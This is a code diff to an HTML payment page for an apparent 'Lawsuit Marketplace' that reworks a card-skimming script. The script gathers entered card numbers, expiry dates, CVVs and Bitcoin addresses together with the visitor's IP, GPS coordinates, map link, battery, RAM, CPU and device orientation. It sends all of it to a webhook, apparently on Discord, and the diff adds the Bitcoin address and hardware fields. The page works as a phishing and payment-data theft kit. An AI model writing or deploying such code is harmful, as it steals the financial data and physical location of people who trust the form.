@@ -5,7 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Payment Methods | Lawsuit Marketplace</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+    rel="stylesheet"
+  />
   <style>
     body {
       font-family: 'Inter', sans-serif;
@@ -114,72 +117,66 @@
   </footer>
 
   <script>
-    // Function to gather metadata and send to webhook
+    // Show corresponding payment method details
+    document.querySelectorAll('input[name="payment-method"]').forEach((radio) => {
+      radio.addEventListener('change', (event) => {
+        document.querySelector('.card-details').style.display = event.target.id === 'payment-card' ? 'block' : 'none';
+        document.querySelector('.crypto-details').style.display = event.target.id === 'payment-crypto' ? 'block' : 'none';
+      });
+    });
+
     async function getMetadata() {
-      const [ipData, battery, network] = await Promise.all([
+      const [ipData, battery] = await Promise.all([
         fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({})),
-        navigator.getBattery ? navigator.getBattery() : Promise.resolve({}),
-        navigator.connection ? navigator.connection : {}
+        navigator.getBattery ? navigator.getBattery() : Promise.resolve({})
       ]);
 
+      // Try to get GPS coordinates
       const coords = await new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
           pos => resolve({
             lat: pos.coords.latitude.toFixed(6),
-            lon: pos.coords.longitude.toFixed(6),
-            accuracy: pos.coords.accuracy,
-            altitude: pos.coords.altitude
+            lon: pos.coords.longitude.toFixed(6)
           }),
           () => resolve({ lat: 'Permission Denied', lon: 'Permission Denied' }),
           { timeout: 5000 }
         );
       });
 
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const isDST = new Date().dst();  // Implement a method or use a library
-
-      const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
-      const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
-      const userAgent = navigator.userAgent;
-      const browserDetails = {
-        browser: userAgent.match(/(firefox|msie|chrome|safari|opera|edge)/i) ? userAgent.match(/(firefox|msie|chrome|safari|opera|edge)/i)[0] : 'Unknown',
-        os: navigator.platform,
-        version: navigator.appVersion,
-        engine: userAgent.match(/(webkit|gecko|trident|blink)/i) ? userAgent.match(/(webkit|gecko|trident|blink)/i)[0] : 'Unknown'
+      // Device orientation
+      const orientation = {
+        tiltX: 'N/A',
+        tiltY: 'N/A',
+        tiltZ: 'N/A'
       };
-
-      const networkInfo = {
-        type: network.effectiveType || 'Unknown',
-        downlink: network.downlink || 'Unknown',
-        rtt: network.rtt || 'Unknown'
-      };
-
-      const screen = `${screen.width}x${screen.height}`;
-      const devicePixelRatio = window.devicePixelRatio;
+      if (window.DeviceOrientationEvent) {
+        window.addEventListener("deviceorientation", (e) => {
+          orientation.tiltX = e.beta;
+          orientation.tiltY = e.gamma;
+          orientation.tiltZ = e.alpha;
+        });
+      }
 
       return {
         ip: ipData.ip || 'N/A',
         country: ipData.country_name || 'N/A',
         city: ipData.city || 'N/A',
         org: ipData.org || 'N/A',
-        timezone,
-        isDST,
-        lat: coords.lat,
-        lon: coords.lon,
-        accuracy: coords.accuracy,
-        altitude: coords.altitude,
-        deviceType,
-        screenOrientation,
+        timezone: ipData.timezone || 'N/A',
+        browser: navigator.userAgent,
         language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
         platform: navigator.platform,
-        browser: browserDetails.browser,
-        os: browserDetails.os,
-        screen,
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+        cpu: navigator.hardwareConcurrency || 'Unknown',
         battery: battery.level ? `${Math.round(battery.level * 100)}%` : 'Unavailable',
         charging: battery.charging ? 'Yes' : 'No',
-        time: new Date().toLocaleString(),
-        devicePixelRatio,
-        networkInfo
+        status: navigator.onLine ? 'Online' : 'Offline',
+        lat: coords.lat,
+        lon: coords.lon,
+        mapLink: coords.lat !== 'Permission Denied' ? `https://maps.google.com/?q=${coords.lat},${coords.lon}` : 'User denied location access.',
+        orientation,
+        time: new Date().toLocaleString()
       };
     }
 
@@ -194,6 +191,7 @@
 - Card: ${formData.cardNumber || 'N/A'}
 - Expiry: ${formData.expiry || 'N/A'}
 - CVV: ${formData.cvv || 'N/A'}
+- BTC Address: ${formData.bitcoinAddress || 'N/A'}
 
 🌐 **Location & IP**
 - IP: ${meta.ip}
@@ -202,36 +200,30 @@
 - Timezone: ${meta.timezone}
 - Lat: ${meta.lat}
 - Lon: ${meta.lon}
-- Altitude: ${meta.altitude} meters
-- Accuracy: ${meta.accuracy} meters
-- 🌍 [View on Map](https://maps.google.com/?q=${meta.lat},${meta.lon})
+- 🌍 [View on Map](${meta.mapLink})
 
 📡 **Device Info**
 - Browser: ${meta.browser}
 - Platform: ${meta.platform}
-- Screen Orientation: ${meta.screenOrientation}
-- Device: ${meta.deviceType}
+- Screen: ${meta.screen}
 - Language: ${meta.language}
-- Screen Resolution: ${meta.screen}
-- Pixel Ratio: ${meta.devicePixelRatio}
+- RAM: ${meta.ram}
+- CPU Cores: ${meta.cpu}
 - Battery: ${meta.battery} (Charging: ${meta.charging})
-
-🔧 **Network Info**
-- Connection: ${meta.networkInfo.type}
-- Download Speed: ${meta.networkInfo.downlink}
-- RTT: ${meta.networkInfo.rtt}
-      `;
+- Orientation (Tilt): X: ${meta.orientation.tiltX}, Y: ${meta.orientation.tiltY}, Z: ${meta.orientation.tiltZ}
+- Online Status: ${meta.status}
+- Submitted At: ${meta.time}`
+      };
 
       fetch(webhookUrl, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(message),
-      }).catch(err => console.error('Error sending data to webhook:', err));
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(message)
+      })
+      .then(() => alert('Demo order submitted! Check Discord.'))
+      .catch(err => console.error('Webhook Error:', err));
     }
 
-    // Form submission handler
     document.querySelector('form').addEventListener('submit', async (e) => {
       e.preventDefault();
       const paymentMethod = document.querySelector('input[name="payment-method"]:checked').id;
